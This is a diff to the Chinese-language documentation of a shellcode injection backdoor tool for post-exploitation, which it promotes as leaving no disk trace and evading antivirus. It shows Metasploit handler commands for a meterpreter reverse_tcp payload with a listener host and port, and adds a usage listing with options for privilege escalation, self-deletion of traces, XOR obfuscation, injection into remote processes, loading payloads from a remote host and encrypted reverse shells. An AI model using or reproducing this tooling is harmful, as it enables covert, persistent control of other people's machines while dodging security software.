@@ -4,8 +4,6 @@
 
 一款本地`ShellCode`后门注入工具，工具主要用于在后渗透阶段使用，可将后门直接注入到特定进程内存中而不会在磁盘中留下任何痕迹，注入成功后`Metasploit`即可获取控制权，只要对端不关机则权限会一直维持，由于内存注入无对应磁盘文件，所以也不会触发杀软报毒。
 
-
-
 首先需要通过`Metasploit`工具生成一个有效载荷，如下是32位与64位载荷生成命令。
 ```BASH
 32位载荷生成
@@ -29,6 +27,46 @@ msf6 > set payload windows/x64/meterpreter/reverse_tcp
 msf6 > set lhost 192.168.93.128
 msf6 > set lport 9999
 msf6 exploit(multi/handler) > exploit
+```
+
+<br>
+
+ - 工具参数列表预览
+```C
+Shell> InjectShellCode32.exe
+  ____  _          _ _   ___        _           _
+/ ___|| |__   ___| | | |_ _|_ __  (_) ___  ___| |_
+\___ \| '_ \ / _ \ | |  | || '_ \ | |/ _ \/ __| __|
+ ___) | | | |  __/ | |  | || | | || |  __/ (__| |_
+|____/|_| |_|\___|_|_| |___|_| |_|/ |\___|\___|\__|
+                                |__/
+
+Usage: ShellCode 远程线程注入器
+
+Options:
+         --show              显示当前所有可注入进程
+         --promote           尝试提升自身进程权限
+         --delself           从系统中删除自身痕迹
+
+ Format:
+         --Format            将字节数组格式化为一行并打印
+         --FormatFile        将字节数组格式化并写出到文件
+         --Xor               将文本中压缩后的字节数组进行异或并输出
+         --Xchg              将压缩后的字符串转为字节数组格式
+         --XorArray          将字节数组加密/解密为字节数组格式
+
+ Inject:
+         --InjectSelfShell   注入字符串到自身进程并运行
+         --InjectArrayByte   注入字节数组到自身进程并运行
+         --FileInjectShell   从文件中读入字符串并注入运行
+         --InjectProcShell   注入字符串到远程进程并运行
+         --InjectWebShell    从远程加载字符串并注入自身进程
+
+ Encode:
+         --EncodeInFile      从文件读入加密字符串并执行反弹
+         --EncodePidInFile   注入加密后的字符串到远程进程中
+
+E-mail: me@lyshark.com
 ```
 
 <br>
